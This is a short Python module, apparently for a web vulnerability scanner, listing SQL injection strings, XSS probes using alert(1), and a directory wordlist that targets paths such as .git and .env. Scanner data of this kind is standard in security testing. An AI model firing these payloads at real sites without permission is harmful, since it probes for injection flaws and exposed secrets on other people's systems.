SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT null--",
    "' OR 'a'='a",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
]

# Directory wordlist
DIR_WORDLIST = [
    "admin",
    "login",
    "backup",
    "config",
    ".git",
    ".env"
]